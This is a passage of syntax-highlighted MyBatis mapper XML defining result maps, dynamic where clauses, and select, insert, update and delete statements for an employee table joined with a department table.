class="string">"email"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"d_id"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"dId"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"WithDeptResultMap"</span> <span class="attr">type</span>=<span class="string">"com.ceit.crud.bean.Employee"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"emp_id"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"empId"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"emp_name"</span> <span class="attr">jdbcType</span>=<span class="string">"VARCHAR"</span> <span class="attr">property</span>=<span class="string">"empName"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"gender"</span> <span class="attr">jdbcType</span>=<span class="string">"CHAR"</span> <span class="attr">property</span>=<span class="string">"gender"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"email"</span> <span class="attr">jdbcType</span>=<span class="string">"VARCHAR"</span> <span class="attr">property</span>=<span class="string">"email"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"d_id"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"dId"</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--    指定联合查询出的部门字段的封装--&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">"department"</span> <span class="attr">javaType</span>=<span class="string">"com.ceit.crud.bean.Department"</span> &gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"dept_id"</span> <span class="attr">property</span>=<span class="string">"deptId"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"dept_name"</span> <span class="attr">property</span>=<span class="string">"deptName"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">association</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">"Example_Where_Clause"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">"oredCriteria"</span> <span class="attr">item</span>=<span class="string">"criteria"</span> <span class="attr">separator</span>=<span class="string">"or"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"criteria.valid"</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">trim</span> <span class="attr">prefix</span>=<span class="string">"("</span> <span class="attr">prefixOverrides</span>=<span class="string">"and"</span> <span class="attr">suffix</span>=<span class="string">")"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">"criteria.criteria"</span> <span class="attr">item</span>=<span class="string">"criterion"</span>&gt;</span></span></span><br><span class="line"><span class="xml">              <span class="tag">&lt;<span class="name">choose</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"criterion.noValue"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  and $</span><span class="template-variable">&#123;criterion.condition&#125;</span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"criterion.singleValue"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  and $</span><span class="template-variable">&#123;criterion.condition&#125;</span><span class="xml"> #</span><span class="template-variable">&#123;criterion.value&#125;</span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"criterion.betweenValue"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  and $</span><span class="template-variable">&#123;criterion.condition&#125;</span><span class="xml"> #</span><span class="template-variable">&#123;criterion.value&#125;</span><span class="xml"> and #</span><span class="template-variable">&#123;criterion.secondValue&#125;</span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"criterion.listValue"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  and $</span><span class="template-variable">&#123;criterion.condition&#125;</span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">close</span>=<span class="string">")"</span> <span class="attr">collection</span>=<span class="string">"criterion.value"</span> <span class="attr">item</span>=<span class="string">"listItem"</span> <span class="attr">open</span>=<span class="string">"("</span> <span class="attr">separator</span>=<span class="string">","</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    #</span><span class="template-variable">&#123;listItem&#125;</span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span></span><br><span class="line"><span class="xml">              <span class="tag">&lt;/<span class="name">choose</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">trim</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">"Update_By_Example_Where_Clause"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">"example.oredCriteria"</span> <span class="attr">item</span>=<span class="string">"criteria"</span> <span class="attr">separator</span>=<span class="string">"or"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"criteria.valid"</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">trim</span> <span class="attr">prefix</span>=<span class="string">"("</span> <span class="attr">prefixOverrides</span>=<span class="string">"and"</span> <span class="attr">suffix</span>=<span class="string">")"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">"criteria.criteria"</span> <span class="attr">item</span>=<span class="string">"criterion"</span>&gt;</span></span></span><br><span class="line"><span class="xml">              <span class="tag">&lt;<span class="name">choose</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"criterion.noValue"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  and $</span><span class="template-variable">&#123;criterion.condition&#125;</span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"criterion.singleValue"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  and $</span><span class="template-variable">&#123;criterion.condition&#125;</span><span class="xml"> #</span><span class="template-variable">&#123;criterion.value&#125;</span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"criterion.betweenValue"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  and $</span><span class="template-variable">&#123;criterion.condition&#125;</span><span class="xml"> #</span><span class="template-variable">&#123;criterion.value&#125;</span><span class="xml"> and #</span><span class="template-variable">&#123;criterion.secondValue&#125;</span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"criterion.listValue"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                  and $</span><span class="template-variable">&#123;criterion.condition&#125;</span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">close</span>=<span class="string">")"</span> <span class="attr">collection</span>=<span class="string">"criterion.value"</span> <span class="attr">item</span>=<span class="string">"listItem"</span> <span class="attr">open</span>=<span class="string">"("</span> <span class="attr">separator</span>=<span class="string">","</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    #</span><span class="template-variable">&#123;listItem&#125;</span></span><br><span class="line"><span class="xml">                  <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span></span><br><span class="line"><span class="xml">              <span class="tag">&lt;/<span class="name">choose</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">trim</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">"Base_Column_List"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    emp_id, emp_name, gender, email, d_id</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">"WithDept_Column_List"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    e.emp_id, e.emp_name, e.gender, e.email, e.d_id, d.dept_id, d.dept_name</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--      List&lt;Employee&gt; selectByExampleWithDept(EmployeeExample example);</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    Employee selectByPrimaryKeyWithDept(Integer empId);</span></span><br><span class="line"><span class="xml">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--  查询员工同时带部门--&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectByExampleWithDept"</span> <span class="attr">resultMap</span>=<span class="string">"WithDeptResultMap"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    select</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"distinct"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      distinct</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"WithDept_Column_List"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    from tbl_emp e</span></span><br><span class="line"><span class="xml">    LEFT JOIN tbl_dept d ON e.`d_id`=d.`dept_id`</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"_parameter != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"Example_Where_Clause"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"orderByClause != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      order by $</span><span class="template-variable">&#123;orderByClause&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectByPrimaryKeyWithDept"</span> <span class="attr">resultMap</span>=<span class="string">"WithDeptResultMap"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    select</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"WithDept_Column_List"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    from tbl_emp e</span></span><br><span class="line"><span class="xml">    LEFT JOIN tbl_dept d ON e.`d_id`=d.`dept_id`</span></span><br><span class="line"><span class="xml">    where emp_id = #</span><span class="template-variable">&#123;empId,jdbcType=INTEGER&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 查询员工不带部门--&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectByExample"</span> <span class="attr">parameterType</span>=<span class="string">"com.ceit.crud.bean.EmployeeExample"</span> <span class="attr">resultMap</span>=<span class="string">"BaseResultMap"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    select</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"distinct"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      distinct</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"Base_Column_List"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    from tbl_emp</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"_parameter != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"Example_Where_Clause"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"orderByClause != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      order by $</span><span class="template-variable">&#123;orderByClause&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectByPrimaryKey"</span> <span class="attr">parameterType</span>=<span class="string">"java.lang.Integer"</span> <span class="attr">resultMap</span>=<span class="string">"BaseResultMap"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    select </span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"Base_Column_List"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    from tbl_emp</span></span><br><span class="line"><span class="xml">    where emp_id = #</span><span class="template-variable">&#123;empId,jdbcType=INTEGER&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">"deleteByPrimaryKey"</span> <span class="attr">parameterType</span>=<span class="string">"java.lang.Integer"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    delete from tbl_emp</span></span><br><span class="line"><span class="xml">    where emp_id = #</span><span class="template-variable">&#123;empId,jdbcType=INTEGER&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">"deleteByExample"</span> <span class="attr">parameterType</span>=<span class="string">"com.ceit.crud.bean.EmployeeExample"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    delete from tbl_emp</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"_parameter != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"Example_Where_Clause"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"insert"</span> <span class="attr">parameterType</span>=<span class="string">"com.ceit.crud.bean.Employee"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    insert into tbl_emp (emp_id, emp_name, gender, </span></span><br><span class="line"><span class="xml">      email, d_id)</span></span><br><span class="line"><span class="xml">    values (#</span><span class="template-variable">&#123;empId,jdbcType=INTEGER&#125;</span><span class="xml">, #</span><span class="template-variable">&#123;empName,jdbcType=VARCHAR&#125;</span><span class="xml">, #</span><span class="template-variable">&#123;gender,jdbcType=CHAR&#125;</span><span class="xml">, </span></span><br><span class="line"><span class="xml">      #</span><span class="template-variable">&#123;email,jdbcType=VARCHAR&#125;</span><span class="xml">, #</span><span class="template-variable">&#123;dId,jdbcType=INTEGER&#125;</span><span class="xml">)</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"insertSelective"</span> <span class="attr">parameterType</span>=<span class="string">"com.ceit.crud.bean.Employee"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    insert into tbl_emp</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">trim</span> <span class="attr">prefix</span>=<span class="string">"("</span> <span class="attr">suffix</span>=<span class="string">")"</span> <span class="attr">suffixOverrides</span>=<span class="string">","</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"empId != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        emp_id,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"empName != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        emp_name,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"gender != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        gender,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"email != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        email,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"dId != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        d_id,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">trim</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">trim</span> <span class="attr">prefix</span>=<span class="string">"values ("</span> <span class="attr">suffix</span>=<span class="string">")"</span> <span class="attr">suffixOverrides</span>=<span class="string">","</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"empId != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        #</span><span class="template-variable">&#123;empId,jdbcType=INTEGER&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"empName != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        #</span><span class="template-variable">&#123;empName,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"gender != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        #</span><span class="template-variable">&#123;gender,jdbcType=CHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"email != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        #</span><span class="template-variable">&#123;email,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"dId != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        #</span><span class="template-variable">&#123;dId,jdbcType=INTEGER&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">trim</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"countByExample"</span> <span class="attr">parameterType</span>=<span class="string">"com.ceit.crud.bean.EmployeeExample"</span> <span class="attr">resultType</span>=<span class="string">"java.lang.Long"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    select count(*) from tbl_emp</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"_parameter != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"Example_Where_Clause"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">"updateByExampleSelective"</span> <span class="attr">parameterType</span>=<span class="string">"map"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    update tbl_emp</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">set</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"record.empId != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        emp_id = #</span><span class="template-variable">&#123;record.empId,jdbcType=INTEGER&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"record.empName != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        emp_name = #</span><span class="template-variable">&#123;record.empName,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"record.gender != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        gender = #</span><span class="template-variable">&#123;record.gender,jdbcType=CHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"record.email != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        email = #</span><span class="template-variable">&#123;record.email,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"record.dId != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        d_id = #</span><span class="template-variable">&#123;record.dId,jdbcType=INTEGER&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"_parameter != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"Update_By_Example_Where_Clause"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">"updateByExample"</span> <span class="attr">parameterType</span>=<span class="string">"map"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    update tbl_emp</span></span><br><span class="line"><span class="xml">    set emp_id = #</span><span class="template-variable">&#123;record.empId,jdbcType=INTEGER&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      emp_name = #</span><span class="template-variable">&#123;record.empName,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      gender = #</span><span class="template-variable">&#123;record.gender,jdbcType=CHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      email = #</span><span class="template-variable">&#123;record.email,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      d_id = #</span><span class="template-variable">&#123;record.dId,jdbcType=INTEGER&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"_parameter != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"Update_By_Example_Where_Clause"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">"updateByPrimaryKeySelective"</span> <span class="attr">parameterType</span>=<span class="string">"com.ceit.crud.bean.Employee"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    update tbl_emp</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">set</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"empName != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        emp_name = #</span><span class="template-variable">&#123;empName,jdbcType=VARCHAR&#125;</span><span 